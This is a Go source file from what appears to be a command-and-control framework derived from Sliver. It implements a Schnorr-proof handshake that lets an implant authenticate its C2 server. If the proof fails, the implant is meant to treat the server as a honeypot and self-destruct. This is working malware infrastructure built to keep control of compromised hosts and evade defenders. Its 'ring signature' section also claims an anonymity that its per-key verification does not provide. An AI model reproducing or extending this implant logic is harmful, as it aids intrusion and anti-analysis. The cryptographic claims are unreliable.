package protocol

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	ZKP-Based C2 Authentication Handshake.

	Protocol:
	  1. Implant → C2:  challenge nonce (32 bytes)
	  2. C2 → Implant:  Schnorr proof  (R, S, ts, message)
	  3. Implant verifies proof using embedded public key X
	  4. Implant → C2:  result (ok/fail)

	If verification fails → implant assumes honeypot → self-destructs.
	If verification succeeds → normal C2 operation begins.
*/

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"time"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/zkp/crypto"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/zkp/schnorr"
)

const (
	HandshakeVersion = uint8(1)
	NonceSize        = 32
	MaxMessageSize   = 16 * 1024
	HandshakeTimeout = 15 * time.Second
)

// ─── Wire messages ────────────────────────────────────────────────────────

type MsgChallenge struct {
	Version   uint8  `json:"v"`
	Nonce     []byte `json:"n"`
	SessionID string `json:"sid"`
	Timestamp int64  `json:"ts"`
}

type MsgProof struct {
	Version uint8  `json:"v"`
	R       []byte `json:"r"` // 33-byte compressed P-256 point
	S       []byte `json:"s"` // 32-byte scalar
	ProofTS int64  `json:"ts"`
	Nonce   []byte `json:"n"`
	Message []byte `json:"m"`
}

type MsgResult struct {
	Version uint8  `json:"v"`
	Success bool   `json:"ok"`
	Error   string `json:"e,omitempty"`
}

type HandshakeResult struct {
	Success    bool
	AuthTime   time.Duration
	ProofTS    time.Time
	FailReason string
}

// ─── Implant side (verifier) ──────────────────────────────────────────────

// ImplantHandshake authenticates an incoming C2 connection using ZKP.
type ImplantHandshake struct {
	verifier  *schnorr.Verifier
	sessionID string
}

// NewImplantHandshake creates the implant-side auth handler.
// c2PublicKey is 33 bytes (compressed P-256), embedded at compile time.
func NewImplantHandshake(c2PublicKey []byte, sessionID string) (*ImplantHandshake, error) {
	v, err := schnorr.NewVerifier(c2PublicKey)
	if err != nil {
		return nil, fmt.Errorf("invalid C2 public key: %w", err)
	}
	return &ImplantHandshake{verifier: v, sessionID: sessionID}, nil
}

// Authenticate performs the full handshake over conn.
// Returns (result, nil) — if result.Success is false, caller should
// self-destruct immediately (this is a honeypot C2).
func (h *ImplantHandshake) Authenticate(conn net.Conn) (*HandshakeResult, error) {
	conn.SetDeadline(time.Now().Add(HandshakeTimeout))
	defer conn.SetDeadline(time.Time{})
	start := time.Now()
	res := &HandshakeResult{}

	// Send challenge nonce.
	nonce := make([]byte, NonceSize)
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	if err := sendMsg(conn, &MsgChallenge{
		Version:   HandshakeVersion,
		Nonce:     nonce,
		SessionID: h.sessionID,
		Timestamp: time.Now().UnixMicro(),
	}); err != nil {
		return nil, err
	}

	// Receive proof.
	var pm MsgProof
	if err := recvMsg(conn, &pm); err != nil {
		return nil, err
	}

	// Decode and verify.
	proof, err := decodeProof(&pm)
	if err != nil {
		res.FailReason = "decode error: " + err.Error()
		sendMsg(conn, &MsgResult{Version: HandshakeVersion, Success: false, Error: res.FailReason})
		return res, nil
	}
	if err := h.verifier.Verify(proof, nonce); err != nil {
		res.FailReason = "proof invalid: " + err.Error()
		sendMsg(conn, &MsgResult{Version: HandshakeVersion, Success: false, Error: res.FailReason})
		return res, nil
	}

	res.Success  = true
	res.AuthTime = time.Since(start)
	res.ProofTS  = time.UnixMicro(pm.ProofTS)
	sendMsg(conn, &MsgResult{Version: HandshakeVersion, Success: true})
	return res, nil
}

// ─── C2 side (prover) ─────────────────────────────────────────────────────

// C2Handshake generates ZKP proofs for C2 authentication.
type C2Handshake struct {
	keyPair *schnorr.KeyPair
	domain  string
}

func NewC2Handshake(keyPair *schnorr.KeyPair, domain string) *C2Handshake {
	return &C2Handshake{keyPair: keyPair, domain: domain}
}

// Respond performs the C2 side of the ZKP handshake.
func (c *C2Handshake) Respond(conn net.Conn) error {
	conn.SetDeadline(time.Now().Add(HandshakeTimeout))
	defer conn.SetDeadline(time.Time{})

	var ch MsgChallenge
	if err := recvMsg(conn, &ch); err != nil {
		return fmt.Errorf("recv challenge: %w", err)
	}
	if ch.Version != HandshakeVersion || len(ch.Nonce) != NonceSize {
		return fmt.Errorf("bad challenge (v=%d, nlen=%d)", ch.Version, len(ch.Nonce))
	}

	message := []byte(ch.SessionID + ":" + c.domain)
	proof, err := c.keyPair.Prove(ch.Nonce, message)
	if err != nil {
		return err
	}
	if err := sendMsg(conn, encodeProof(proof)); err != nil {
		return err
	}

	var result MsgResult
	if err := recvMsg(conn, &result); err != nil {
		return err
	}
	if !result.Success {
		return fmt.Errorf("implant rejected: %s", result.Error)
	}
	return nil
}

// ─── Ring signature for multi-operator setups ────────────────────────────

// RingKeySet holds N public keys — any one can authenticate.
type RingKeySet struct {
	PublicKeys [][]byte // N × 33-byte compressed P-256 points
}

// RingHandshake allows any key in the ring to authenticate without
// revealing which specific key was used.
type RingHandshake struct {
	keyPair *schnorr.KeyPair
	ring    *RingKeySet
	domain  string
}

func NewRingHandshake(kp *schnorr.KeyPair, ring *RingKeySet, domain string) (*RingHandshake, error) {
	// Verify the keypair is in the ring.
	myPub := kp.PublicKey.Bytes()
	found := false
	for _, pk := range ring.PublicKeys {
		if bytesEqual(pk, myPub) {
			found = true
			break
		}
	}
	if !found {
		return nil, fmt.Errorf("keypair not in ring")
	}
	return &RingHandshake{keyPair: kp, ring: ring, domain: domain}, nil
}

// RingVerifier verifies that the prover is any member of the ring.
// The implant embeds the entire RingKeySet (all public keys).
type RingVerifier struct {
	ring      *RingKeySet
	verifiers []*schnorr.Verifier
}

func NewRingVerifier(ring *RingKeySet) (*RingVerifier, error) {
	vs := make([]*schnorr.Verifier, len(ring.PublicKeys))
	for i, pk := range ring.PublicKeys {
		v, err := schnorr.NewVerifier(pk)
		if err != nil {
			return nil, fmt.Errorf("ring key %d: %w", i, err)
		}
		vs[i] = v
	}
	return &RingVerifier{ring: ring, verifiers: vs}, nil
}

// VerifyAny returns nil if the proof is valid for ANY key in the ring.
func (rv *RingVerifier) VerifyAny(proof *schnorr.Proof, nonce []byte) error {
	for _, v := range rv.verifiers {
		if v.Verify(proof, nonce) == nil {
			return nil // one of the ring members proved knowledge
		}
	}
	return fmt.Errorf("proof not valid for any ring member")
}

// ─── Wire protocol helpers ────────────────────────────────────────────────

func sendMsg(conn net.Conn, v interface{}) error {
	data, err := json.Marshal(v)
	if err != nil {
		return err
	}
	var lb [4]byte
	binary.BigEndian.PutUint32(lb[:], uint32(len(data)))
	conn.Write(lb[:])
	_, err = conn.Write(data)
	return err
}

func recvMsg(conn net.Conn, v interface{}) error {
	var lb [4]byte
	if _, err := io.ReadFull(conn, lb[:]); err != nil {
		return err
	}
	n := binary.BigEndian.Uint32(lb[:])
	if n > MaxMessageSize {
		return fmt.Errorf("message too large: %d", n)
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return err
	}
	return json.Unmarshal(buf, v)
}

func encodeProof(p *schnorr.Proof) *MsgProof {
	return &MsgProof{
		Version: HandshakeVersion,
		R:       p.R.Bytes(),
		S:       p.S.Bytes(),
		ProofTS: p.Timestamp,
		Nonce:   p.Nonce,
		Message: p.Message,
	}
}

func decodeProof(m *MsgProof) (*schnorr.Proof, error) {
	g := crypto.DefaultGroup()
	R, err := g.PointFromBytes(m.R)
	if err != nil {
		return nil, fmt.Errorf("R: %w", err)
	}
	if len(m.S) != 32 {
		return nil, fmt.Errorf("S must be 32 bytes, got %d", len(m.S))
	}
	S := g.NewScalar(new(big.Int).SetBytes(m.S))
	return &schnorr.Proof{
		R: R, S: S,
		Timestamp: m.ProofTS,
		Nonce:     m.Nonce,
		Message:   m.Message,
	}, nil
}

func bytesEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	var d byte
	for i := range a {
		d |= a[i] ^ b[i]
	}
	return d == 0
}
